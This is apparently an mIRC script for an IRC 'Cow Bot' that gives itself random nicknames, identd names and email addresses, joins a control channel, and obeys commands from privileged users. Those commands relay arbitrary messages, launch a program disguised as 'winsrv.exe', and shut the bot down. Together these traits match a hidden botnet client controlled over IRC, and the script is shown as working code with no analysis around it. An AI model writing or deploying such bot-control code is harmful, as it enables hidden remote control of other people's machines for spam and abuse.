   [script]
   n0=on 1:START:{
   n1=  nick [cow]- $+ $rand(a,z) $+ $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)
   n2=  anick [cow]- $+ $rand(a,z) $+ $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)
   n3=  identd on $rand(a,z) $+ $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)
   n4=  emailaddr $rand(a,z) $+ $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)  $+  $rand(a,z)
   n5=}
   n6=
   n7=on 1:CONNECT:{
   n8=  /join %chan
   n9=}
   n10=
   n11=on 2:TEXT:*:%chan:{
   n12=  if ($1 == .version) { msg %chan Cow Bot 1.1 (Inspired by Quakenet, Created by Source) }
   n13=  elseif ($1 == .msg) { msg $2 $3- }
   n14=  elseif ($1 == .restart) { msg %chan Restarting EXE.. | /run winsrv.exe | disconnect | /timer 1 1 /exit }
   n15=  elseif ($1 == .quit) { disconnect | /timer 1 1 /exit }
   n16=}
